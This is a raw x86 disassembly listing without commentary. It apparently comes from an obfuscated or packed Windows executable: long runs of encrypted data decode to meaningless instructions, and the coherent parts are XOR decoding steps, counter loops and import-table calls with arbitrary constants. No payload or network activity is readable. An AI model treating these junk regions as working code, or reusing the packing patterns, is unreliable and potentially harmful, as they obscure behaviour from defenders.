  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4336eb,0x43366f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4336e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	jmp    0xf4eb91f9
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x40514f
  405191:	push   0xffffff94
  405193:	xor    BYTE PTR [edi-0x49],dl
  405196:	fwait
  405197:	inc    edx
  405198:	(bad)
  40519b:	push   ebx
  40519c:	lods   eax,DWORD PTR ds:[esi]
  40519d:	pop    ss
  40519e:	xlat   BYTE PTR ds:[ebx]
  40519f:	jne    0x4051f6
  4051a1:	jl     0x405127
  4051a3:	jns    0x4051ea
  4051a5:	sbb    DWORD PTR [ebx-0x6],0x94febb46
  4051ac:	fcom   DWORD PTR [eax-0x5f4d8df3]
  4051b2:	sbb    DWORD PTR [ebp-0x6223f7c2],eax
  4051b8:	jb     0x4051a5
  4051ba:	and    edi,DWORD PTR [ecx+0xb]
  4051bd:	jecxz  0x4051de
  4051bf:	dec    ebx
  4051c0:	mov    ebx,0x936cd423
  4051c5:	mov    esi,0x83440b7f
  4051ca:	mov    dl,0x81
  4051cc:	popf   
  4051cd:	mov    BYTE PTR [edi+ebp*1+0x295130c0],al
  4051d4:	arpl   WORD PTR [ebx+0x43550a31],bp
  4051da:	adc    DWORD PTR [edi],ebp
  4051dc:	aas    
  4051dd:	aaa    
  4051de:	jle    0x405235
  4051e0:	nop
  4051e1:	stos   DWORD PTR es:[edi],eax
  4051e2:	push   esp
  4051e3:	xchg   edx,eax
  4051e4:	or     bh,BYTE PTR [ebp+0x563ded95]
  4051ea:	mov    ds:0x2e4139fb,eax
  4051ef:	out    0xed,eax
  4051f1:	ja     0x405203
  4051f3:	mov    ebp,0x4b443838
  4051f8:	call   FWORD PTR [ecx+ecx*8-0x2b888ee3]
  4051ff:	inc    esi
  405200:	int    0x94
  405202:	fisttp QWORD PTR [ecx+0x3097e8eb]
  405208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405209:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40520b:	mov    DWORD PTR [ebx],ebx
  40520d:	std    
  40520e:	sub    bl,dl
  405210:	loop   0x40522d
  405212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405213:	xor    ebp,DWORD PTR [ebx-0x52]
  405216:	pop    esi
  405217:	test   BYTE PTR [edx],cl
  405219:	js     0x405268
  40521b:	mov    ebx,0x2cad556
  405220:	rcl    BYTE PTR [edi],1
  405222:	hlt    
  405223:	stos   DWORD PTR es:[edi],eax
  405224:	scas   al,BYTE PTR es:[edi]
  405225:	imul   eax,DWORD PTR [esi+0x547003bb],0xffffffb6
  40522c:	popa   
  40522d:	mov    al,ds:0xfb63b0d1
  405232:	cwde   
  405233:	jmp    0x5ffbeaa7
  405238:	dec    ebx
  405239:	mov    esi,0xe24aad0f
  40523e:	outs   dx,DWORD PTR ds:[esi]
  40523f:	std    
  405240:	out    0xf5,eax
  405242:	or     edx,DWORD PTR [esi+0x6a847dc]
  405248:	or     al,0x1d
  40524a:	mov    ebx,0xeddb3bff
  40524f:	scas   eax,DWORD PTR es:[edi]
  405250:	pop    ss
  405251:	call   0x5569cddd
  405256:	push   ds
  405257:	push   0xbfdc2b0a
  40525c:	cmc    
  40525d:	arpl   WORD PTR es:[edi-0x1e6c80c2],cx
  405264:	test   DWORD PTR [edi+0x30],eax
  405267:	test   bl,0x63
  40526a:	shl    BYTE PTR [ebx-0x2a],1
  40526d:	cmp    BYTE PTR [eax-0x4a],bh
  405270:	fwait
  405271:	sti    
  405272:	ret    
  405273:	sbb    al,0xca
  405275:	cmp    al,0xe0
  405277:	call   DWORD PTR [eax-0x4993a7e]
  40527d:	push   es
  40527e:	mov    esp,0x4ff4e57c
  405283:	fnstcw WORD PTR [ebx-0x5b96e103]
  405289:	add    BYTE PTR [eax-0x65],dl
  40528c:	aas    
  40528d:	sbb    BYTE PTR [edi+eax*2],0x3b
  405291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405292:	pushf  
  405293:	mov    ds:0x7f5e777a,eax
  405298:	pop    edi
  405299:	jle    0x40528d
  40529b:	hlt    
  40529c:	pop    es
  40529d:	xchg   esp,eax
  40529e:	mov    dh,0x8e
  4052a0:	ins    DWORD PTR es:[edi],dx
  4052a1:	jne    0x405286
  4052a3:	pop    edx
  4052a4:	push   es
  4052a5:	arpl   WORD PTR [edi],sp
  4052a7:	mov    al,0x9c
  4052a9:	dec    eax
  4052aa:	aas    
  4052ab:	je     0x4052f8
  4052ad:	and    BYTE PTR [esi-0x74],cl
  4052b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b1:	mov    eax,ds:0x14e38459
  4052b6:	ret    
  4052b7:	and    eax,edi
  4052b9:	pop    ds
  4052ba:	mov    edi,0x5110aaf8
  4052bf:	cmp    al,BYTE PTR [ebp-0x38]
  4052c2:	nop
  4052c3:	inc    eax
  4052c4:	and    ch,ah
  4052c6:	mov    bl,0xb7
  4052c8:	xor    al,0x3d
  4052ca:	lods   al,BYTE PTR ds:[esi]
  4052cb:	mov    dl,0x90
  4052cd:	jmp    0x4052f4
  4052cf:	jge    0x405349
  4052d1:	test   al,0xdf
  4052d3:	sti    
  4052d4:	loope  0x4052c6
  4052d6:	repz jecxz 0x4052b7
  4052d9:	addr16 pop esp
  4052db:	mov    ds:0xaa579681,al
  4052e0:	adc    eax,0x94851efd
  4052e5:	std    
  4052e6:	jecxz  0x4052c3
  4052e8:	dec    edx
  4052e9:	push   esi
  4052ea:	sub    eax,0x31b31cbd
  4052ef:	add    BYTE PTR [eax+eiz*4],cl
  4052f2:	cwde   
  4052f3:	xchg   esp,eax
  4052f4:	lods   al,BYTE PTR ds:[esi]
  4052f5:	and    DWORD PTR [ecx+edx*2],edx
  4052f8:	mov    dl,0x73
  4052fa:	(bad)  
  4052fb:	(bad)  
  4052fc:	push   0x35
  4052fe:	cmp    bh,al
  405300:	mov    eax,ds:0x96877850
  405305:	jmp    0x405314
  405307:	arpl   WORD PTR [ecx+0x2d],dx
  40530a:	(bad)  
  40530c:	sub    DWORD PTR [ebx-0x47],edi
  40530f:	cs dec eax
  405311:	addr16 out 0xce,eax
  405314:	xchg   DWORD PTR [edx-0x7ce6385f],eax
  40531a:	mov    ch,0x2c
  40531c:	or     al,cl
  40531e:	add    ebp,DWORD PTR [ecx-0x2e27f16f]
  405324:	ins    BYTE PTR es:[edi],dx
  405325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405326:	popa   
  405327:	dec    ebp
  405328:	call   0x36d261a5
  40532d:	fld    TBYTE PTR [edx]
  40532f:	pop    eax
  405330:	mov    cl,0x86
  405332:	mov    al,0x34
  405334:	push   0x1abfb1d2
  405339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40533a:	out    0x92,eax
  40533c:	stos   BYTE PTR es:[edi],al
  40533d:	cwde   
  40533e:	or     eax,0x36875521
  405343:	enter  0x6101,0xc7
  405347:	loopne 0x40533a
  405349:	call   0x9d1ce746
  40534e:	(bad)  
  40534f:	rcr    edx,cl
  405351:	outs   dx,BYTE PTR ds:[esi]
  405352:	mov    ecx,0xd0c1ac91
  405357:	mov    BYTE PTR ds:[ebx+0x4c0625d4],ah
  40535e:	ror    BYTE PTR [eax],0x65
  405361:	mov    dl,0xca
  405363:	dec    eax
  405364:	shl    BYTE PTR [eax+0x17fd343a],cl
  40536a:	icebp  
  40536b:	cmp    bh,0xcd
  40536e:	nop
  40536f:	pop    eax
  405370:	adc    edx,DWORD PTR [bx+di+0x28fd]
  405375:	mov    edx,0xd250e098
  40537a:	pushf  
  40537b:	loopne 0x405379
  40537d:	leave  
  40537e:	add    eax,0xba5611c7
  405383:	jno    0x405376
  405385:	repz mov dl,0x94
  405388:	std    
  405389:	add    BYTE PTR [edx+0x63e7d92a],ah
  40538f:	loopne 0x405366
  405391:	add    eax,0x1831c426
  405396:	rcr    DWORD PTR [edi-0x57],cl
  405399:	adc    esp,esi
  40539b:	or     al,0xdf
  40539d:	hlt    
  40539e:	mov    ds:0x9dc6aaa5,eax
  4053a3:	into   
  4053a4:	xor    DWORD PTR [ecx],edx
  4053a6:	mov    cl,0x47
  4053a8:	push   esi
  4053a9:	dec    ebx
  4053aa:	aam    0xa5
  4053ac:	add    ch,BYTE PTR [ebx]
  4053ae:	pop    edx
  4053af:	pop    ss
  4053b0:	aad    0xd5
  4053b2:	sbb    BYTE PTR [edx+0x59],bl
  4053b5:	pop    edx
  4053b6:	outs   dx,BYTE PTR ds:[esi]
  4053b7:	xor    DWORD PTR [esi-0xa],eax
  4053ba:	cmp    ebx,eax
  4053bc:	retf   
  4053bd:	or     al,0x9d
  4053bf:	ret    0xb33
  4053c2:	scas   eax,DWORD PTR es:[edi]
  4053c3:	fnstsw ax
  4053c5:	int    0x38
  4053c7:	push   es
  4053c8:	daa    
  4053c9:	cmp    edi,edi
  4053cb:	jae    0x4053ce
  4053cd:	push   ecx
  4053ce:	mov    ss,WORD PTR [eax+0x28a6863]
  4053d4:	dec    ebp
  4053d5:	(bad)  
  4053d7:	jo     0x405405
  4053d9:	push   edi
  4053da:	mov    dh,0xb1
  4053dc:	jnp    0x405413
  4053de:	std    
  4053df:	or     DWORD PTR [edi+0x4fd06f58],eax
  4053e5:	jge    0x4053f1
  4053e7:	nop
  4053e8:	mov    dl,0x5f
  4053ea:	mov    ds:0x812c3fa1,al
  4053ef:	inc    ebp
  4053f0:	xor    BYTE PTR [edx],0x47
  4053f3:	arpl   WORD PTR [ebp+0x20f914aa],dx
  4053f9:	jmp    0x3c29:0xad45da7
  405400:	addr16 hlt 
  405402:	js     0x405479
  405404:	pop    edi
  405405:	mov    edi,0x17147734
  40540a:	mov    bh,BYTE PTR [eax]
  40540c:	pop    ecx
  40540d:	stos   BYTE PTR es:[edi],al
  40540e:	xor    ah,BYTE PTR [ecx-0x5a]
  405411:	mov    ds:0xc9bf1b86,eax
  405416:	enter  0x59f0,0x76
  40541a:	sbb    al,0x97
  40541c:	inc    BYTE PTR [ebp+0x1143474b]
  405422:	call   0x56121f2f
  405427:	xor    ecx,edx
  405429:	fldenv [ebp-0x2823c66e]
  40542f:	sub    BYTE PTR [edi+edi*4-0x5b2a05c6],ah
  405436:	std    
  405437:	pop    edx
  405438:	hlt    
  405439:	inc    eax
  40543a:	adc    BYTE PTR [esi-0x763a3182],dl
  405440:	xor    al,0xfb
  405442:	clc    
  405443:	add    ah,BYTE PTR [esi+0x284bd47a]
  405449:	mov    al,ds:0x13939899
  40544e:	mov    ds:0x1d6392b1,eax
  405453:	shl    dl,1
  405455:	int3   
  405456:	aam    0x1d
  405458:	jno    0x4054cb
  40545a:	push   cs
  40545b:	jbe    0x4054a8
  40545d:	xor    ah,BYTE PTR ds:0x67c4a36c
  405463:	fild   WORD PTR ss:[eax-0x515448c0]
  40546a:	mov    ebp,0x7b205918
  40546f:	jo     0x405447
  405471:	sbb    esp,DWORD PTR [esi+0x3d]
  405474:	cmp    DWORD PTR [ecx+0x310611a1],0x3c
  40547b:	mov    ecx,0xbdd96164
  405480:	pop    ss
  405481:	inc    esi
  405482:	cmp    BYTE PTR [esi],ah
  405484:	test   al,0xed
  405486:	adc    BYTE PTR [edx-0x405fb9b0],bl
  40548c:	xchg   edi,eax
  40548d:	push   0x7f
  40548f:	ret    
  405490:	retf   
  405491:	mov    gs,WORD PTR [edi]
  405493:	pop    eax
  405494:	sahf   
  405495:	prefetchw BYTE PTR [esi+0x133cb795]
  40549c:	ins    DWORD PTR es:[edi],dx
  40549d:	xchg   ecx,eax
  40549e:	pop    edx
  4054a0:	mov    al,ds:0x5efbbfa7
  4054a5:	mov    al,ds:0xc1fcc885
  4054aa:	sub    esp,esp
  4054ac:	push   0x58
  4054ae:	ret    0x38d5
  4054b1:	or     al,cl
  4054b3:	fbstp  TBYTE PTR [ebx+0x26]
  4054b6:	mov    gs:0xa2575025,al
  4054bc:	push   eax
  4054bd:	inc    edx
  4054be:	ficom  DWORD PTR [ebx-0x749a1ded]
  4054c4:	mov    ecx,0x1503cb00
  4054c9:	xchg   ebx,eax
  4054ca:	sbb    BYTE PTR [edx-0x162efccf],bh
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4336e7
  4054e3:	or     DWORD PTR ds:0x433703,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4336f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4336f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4336f3,ebx
  405504:	cmp    DWORD PTR ds:0x4336f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4336f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4336f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4336f3,ebx
  405545:	cmp    DWORD PTR ds:0x4336f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4336f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4336b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4336b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4336b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4336b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433846
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4336b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xe9b18fe9
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055ff
  40563a:	add    bh,BYTE PTR [ebp+0x63b6415a]
  405640:	xchg   edi,eax
  405641:	mov    dl,0xcb
  405643:	fldcw  WORD PTR [ecx]
  405645:	fcom   st(0)
  405647:	repz mov edi,0x9c22a588
  40564d:	xchg   esi,eax
  40564e:	xor    al,0x22
  405650:	test   al,0xf8
  405652:	xchg   BYTE PTR [edi-0x3fa75c2f],dl
  405658:	out    0xd5,al
  40565a:	cdq    
  40565b:	mov    ebx,0xcf3bd115
  405660:	fwait
  405661:	nop
  405662:	xchg   edx,eax
  405663:	add    al,0xc9
  405665:	mov    ch,0xef
  405667:	icebp  
  405668:	repnz pop es
  40566a:	cmc    
  40566b:	lock mov ah,0xca
  40566e:	jno    0x40564f
  405670:	ds pop ds
  405672:	imul   ebp,DWORD PTR [eax-0x74],0x34
  405676:	add    bh,0x8d
  405679:	push   eax
  40567a:	mov    cl,0x77
  40567c:	xor    eax,0xf954345d
  405681:	push   0xffffffdc
  405683:	mov    al,ds:0x8cf072b8
  405688:	xor    esi,DWORD PTR [edi+0x4]
  40568b:	rcr    DWORD PTR es:[edi+eax*2],0x3e
  405690:	dec    esi
  405691:	bound  ebx,QWORD PTR [ebx+edi*8+0x21]
  405695:	out    dx,eax
  405696:	mov    ecx,0xed92fb1f
  40569b:	push   ebx
  40569c:	inc    edi
  40569d:	lock (bad) 
  40569f:	(bad)  
  4056a0:	stos   DWORD PTR es:[edi],eax
  4056a1:	sub    DWORD PTR [ebp+esi*8-0x3b41913f],ecx
  4056a8:	cld    
  4056a9:	jmp    0xdcfbbcd8
  4056ae:	sbb    cl,cl
  4056b0:	push   0x655bd18a
  4056b5:	jnp    0x405642
  4056b7:	push   esp
  4056b8:	lea    esi,[ecx]
  4056ba:	mov    DWORD PTR [ebx],ebx
  4056bc:	icebp  
  4056bd:	ins    BYTE PTR es:[edi],dx
  4056be:	jmp    0xfed49c3d
  4056c3:	add    eax,0x54ee0b39
  4056c8:	int3   
  4056c9:	pop    ebx
  4056ca:	sahf   
  4056cb:	push   esp
  4056cc:	test   al,0xc6
  4056ce:	mov    ah,0xe0
  4056d0:	iret   
  4056d1:	xchg   esi,eax
  4056d2:	aad    0x64
  4056d4:	sbb    eax,0xc5f314c0
  4056d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056da:	and    al,0xa
  4056dc:	pop    es
  4056dd:	fistp  DWORD PTR [ecx+0x5d]
  4056e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056e1:	jo     0x4056e6
  4056e3:	shl    BYTE PTR [ebx-0x5a],1
  4056e6:	cs es aas 
  4056e9:	sbb    al,0x52
  4056eb:	inc    ecx
  4056ec:	call   0x9f76fe03
  4056f1:	bound  edi,QWORD PTR [esp+eax*4+0x7e]
  4056f5:	or     ecx,DWORD PTR [ecx+0x36093277]
  4056fb:	ror    bl,1
  4056fd:	cmp    bh,bh
  4056ff:	xchg   edi,eax
  405700:	jmp    0x3f60:0xcb59b9ff
  405707:	cmp    cl,BYTE PTR [esi+0x42c18ad7]
  40570d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40570e:	or     BYTE PTR [ecx-0x69],dh
  405711:	pop    edi
  405712:	xchg   ecx,eax
  405713:	adc    DWORD PTR [ebp+0x3c],esi
  405716:	bound  esi,QWORD PTR [ebx+0x2c]
  405719:	pop    eax
  40571a:	sti    
  40571b:	clc    
  40571c:	pop    ds
  40571d:	mov    WORD PTR [edx+ebp*8],cs
  405720:	xchg   ecx,eax
  405721:	add    esp,DWORD PTR [eax]
  405723:	push   ss
  405724:	out    dx,eax
  405725:	and    DWORD PTR ds:0xcdcc87da,0xffffff99
  40572c:	xor    al,0x9
  40572e:	and    BYTE PTR [eax-0x7ffc1a2d],ah
  405734:	frstor [edx]
  405736:	fsubr  DWORD PTR [esi-0x6b1cf1db]
  40573c:	lods   eax,DWORD PTR ds:[esi]
  40573d:	dec    edx
  40573e:	rol    BYTE PTR [eax],0xb0
  405741:	inc    ecx
  405742:	iret   
  405743:	pop    ebp
  405744:	hlt    
  405745:	inc    ecx
  405746:	shr    esi,cl
  405748:	jne    0x405736
  40574a:	add    al,0x96
  40574c:	xor    ch,BYTE PTR ds:0x4a3a0f7
  405752:	in     eax,dx
  405753:	mov    cl,0x29
  405755:	ins    BYTE PTR es:[edi],dx
  405756:	sbb    eax,0xb61aada
  40575b:	dec    ebp
  40575c:	repnz pop ss
  40575e:	push   edi
  40575f:	jae    0x405746
  405761:	sbb    eax,0x743851f6
  405766:	push   edx
  405767:	add    BYTE PTR ds:0x6dc0448f,al
  40576d:	cli    
  40576e:	mov    esi,ecx
  405770:	fcmovnb st,st(2)
  405772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405773:	xor    al,0x9f
  405775:	lods   al,BYTE PTR ds:[esi]
  405776:	cld    
  405777:	push   ecx
  405778:	pop    ss
  405779:	std    
  40577a:	jmp    0xd8628ada
  40577f:	je     0x4057cf
  405781:	mov    ss,WORD PTR [ecx-0x465d7a6c]
  405787:	je     0x40579c
  405789:	xor    DWORD PTR [ebp-0x1a],esi
  40578c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40578d:	inc    eax
  40578e:	cmp    esi,DWORD PTR [esi+0x62]
  405791:	fsubrp st(3),st
  405793:	dec    esp
  405794:	repz push esp
  405796:	in     al,0x62
  405798:	mov    eax,ds:0xb423b297
  40579d:	retf   0x9c4c
  4057a0:	dec    edx
  4057a1:	add    bl,bl
  4057a3:	jecxz  0x4057ec
  4057a5:	js     0x4057a8
  4057a7:	jmp    0x40573f
  4057a9:	mov    eax,ds:0x117996df
  4057ae:	mov    WORD PTR [eax+0x795f8230],ds
  4057b4:	jb     0x405817
  4057b6:	or     BYTE PTR [ecx],ah
  4057b8:	xor    eax,0xffffffaf
  4057bb:	push   esi
  4057bc:	imul   ebx,DWORD PTR [edx-0xa],0xd139867d
  4057c3:	call   0x8d76:0x65359e40
  4057ca:	aam    0xc1
  4057cc:	imul   edx,DWORD PTR [edx],0x5c19d4ed
  4057d2:	jae    0x4057e6
  4057d4:	fld    TBYTE PTR [esp+esi*4-0x6e4a2719]
  4057db:	push   edi
  4057dc:	popf   
  4057dd:	gs leave 
  4057df:	pop    es
  4057e0:	pop    edx
  4057e1:	inc    ebp
  4057e2:	pcmpgtw mm6,QWORD PTR [edx+0x6835c076]
  4057e9:	lea    esi,ds:0x80a03c51
  4057ef:	(bad)  
  4057f0:	rol    DWORD PTR [edx-0x5ad44642],cl
  4057f6:	cmp    ecx,eax
  4057f8:	cs push cs
  4057fa:	lds    ebx,FWORD PTR [edx]
  4057fc:	sbb    DWORD PTR [ebp+0x8b34a83],edx
  405802:	xor    eax,0x9cf23b1a
  405807:	push   es
  405808:	bound  edi,QWORD PTR [edi]
  40580a:	push   es
  40580b:	das    
  40580c:	or     BYTE PTR [ecx+0xc],dl
  40580f:	and    DWORD PTR [edi-0x33],ecx
  405812:	dec    edx
  405813:	leave  
  405814:	sub    bh,BYTE PTR [eax]
  405816:	sti    
  405817:	int    0xe
  405819:	dec    edx
  40581a:	push   eax
  40581b:	into   
  40581c:	xchg   esi,eax
  40581d:	cli    
  40581e:	aam    0xb9
  405820:	inc    esi
  405821:	mov    cl,0xb
  405823:	xchg   ebx,eax
  405824:	or     eax,0xf5b2029
  405829:	mov    esp,0xb92e1037
  40582e:	arpl   WORD PTR [ebp+0x24],bx
  405831:	call   0xfc612b6b
  405836:	push   ecx
  405837:	and    eax,0xc4ebf746
  40583c:	jo     0x40588a
  40583e:	cmp    eax,eax
  405840:	adc    ebx,0x4f8610a
  405846:	iret   
  405847:	fist   WORD PTR [ebx-0x2cb5c0cf]
  40584d:	mov    edx,0x87e57ea6
  405852:	iret   
  405853:	pop    ecx
  405854:	xchg   ebx,eax
  405855:	or     ebp,esi
  405857:	sti    
  405858:	int    0x5f
  40585a:	dec    edi
  40585b:	out    0xe0,al
  40585d:	fldcw  WORD PTR [ecx-0x57ede5]
  405863:	mov    dh,0x42
  405865:	in     eax,0x30
  405867:	cmp    al,BYTE PTR [esi-0x45]
  40586a:	add    eax,0x9dae8bbe
  40586f:	push   ss
  405870:	push   ds
  405871:	loop   0x405875
  405873:	clc    
  405874:	dec    ebx
  405875:	mov    al,0x18
  405877:	pop    edi
  405878:	cs nop
  40587a:	xor    esi,DWORD PTR [esi+ebx*2+0x7b1c430b]
  405881:	adc    al,0x40
  405883:	mov    ecx,0xedba8487
  405888:	ficom  DWORD PTR [ebx]
  40588a:	mov    bh,0xa
  40588c:	or     al,dl
  40588e:	sub    al,bl
  405890:	fs daa 
  405892:	rcl    DWORD PTR [esi-0x3b],cl
  405895:	push   eax
  405896:	fdivp  st(3),st
  405898:	pop    ss
  405899:	stos   BYTE PTR es:[edi],al
  40589a:	mov    gs,WORD PTR [eax+0x4a]
  40589d:	and    eax,0x7d9fa507
  4058a2:	or     DWORD PTR [esi-0x9566383],esp
  4058a8:	in     al,dx
  4058a9:	pop    ecx
  4058aa:	lea    esi,ds:0x60f20def
  4058b0:	test   al,0x45
  4058b2:	xlat   BYTE PTR ds:[ebx]
  4058b3:	jge    0x40589d
  4058b5:	daa    
  4058b6:	and    eax,0x265e9d66
  4058bb:	and    dl,BYTE PTR [ebx-0x53dccc00]
  4058c1:	int3   
  4058c2:	frstor [esi-0x6]
  4058c5:	out    0x95,al
  4058c7:	push   0xf121befd
  4058cc:	add    dh,BYTE PTR [ebx+0x40]
  4058cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058d0:	mov    ebx,edi
  4058d2:	daa    
  4058d3:	dec    ebp
  4058d4:	push   esi
  4058d5:	fist   DWORD PTR [ecx-0xed1d76a]
  4058db:	bnd js 0x405884
  4058de:	shl    BYTE PTR [esi-0x77],cl
  4058e1:	lods   al,BYTE PTR ds:[esi]
  4058e2:	imul   eax,DWORD PTR [edi+0x6d6f7484],0xffffffdf
  4058e9:	adc    eax,0x813e07d0
  4058ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ef:	pop    ecx
  4058f0:	enter  0x6019,0xe8
  4058f4:	fdivr  DWORD PTR [esi+ebp*8]
  4058f7:	ds sub eax,0x472ce554
  4058fd:	test   eax,0xbb9f39d3
  405902:	ja     0x40590d
  405904:	idiv   esp
  405906:	(bad)  
  405908:	mov    al,ds:0xeee190fc
  40590d:	rol    BYTE PTR [eax-0x49d3eb66],cl
  405913:	xor    al,0x7d
  405915:	dec    ebx
  405916:	adc    dl,BYTE PTR [esi-0xcac79fa]
  40591c:	xchg   ebp,eax
  40591d:	dec    esi
  40591e:	lock mov al,0x1a
  405921:	(bad)  
  405922:	imul   eax,ebp,0x3b62a8f6
  405928:	mov    edx,0xf509d4e0
  40592d:	sub    DWORD PTR [esi+0x49],edi
  405930:	sbb    esp,0xb4f4fda9
  405936:	lock aam 0x8b
  405939:	or     bl,al
  40593b:	mov    al,0x69
  40593d:	daa    
  40593e:	mov    ds:0x15be78b7,al
  405943:	pop    eax
  405944:	or     BYTE PTR [ecx+0x46153b3a],bl
  40594a:	or     BYTE PTR [eax],cl
  40594c:	inc    esi
  40594d:	xor    dh,cl
  40594f:	ins    DWORD PTR es:[edi],dx
  405950:	pop    esi
  405951:	nop
  405952:	mov    BYTE PTR [eax],bh
  405954:	add    al,0xc2
  405956:	ins    BYTE PTR es:[edi],dx
  405957:	cs mov esp,0xc61f628
  40595d:	push   0x767b97ff
  405962:	ret    
  405963:	out    0x0,eax
  405965:	sbb    ch,BYTE PTR [ebp-0x57]
  405968:	pop    ds
  405969:	xchg   BYTE PTR [ebp-0x5e29698],ah
  40596f:	fimul  DWORD PTR [ebx+0x32ac5921]
  405975:	fimul  WORD PTR [ebx+0x5ee9d055]
  40597b:	or     al,BYTE PTR [eax]
  40597d:	add    BYTE PTR [ebx+0x7d8bc855],cl
  405983:	cld    
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	loopne 0x405a1d
  4059b2:	mov    ?,WORD PTR [eax+0x6a]
  4059b5:	xor    bh,BYTE PTR [esi+0x7e]
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x4059cf
  4059bd:	push   esp
  4059be:	ret    0xf9ba
  4059c1:	mov    WORD PTR [edx-0x434cd24],ss
  4059c7:	jg     0x4059f6
  4059c9:	cmp    al,0xb
  4059cb:	repz xlat BYTE PTR ds:[ebx]
  4059cd:	mov    al,0x31
  4059cf:	mov    edi,0xc15e993f
  4059d4:	cmp    ebx,DWORD PTR [ebp-0x17]
  4059d7:	mov    ?,WORD PTR [ebp+0x53]
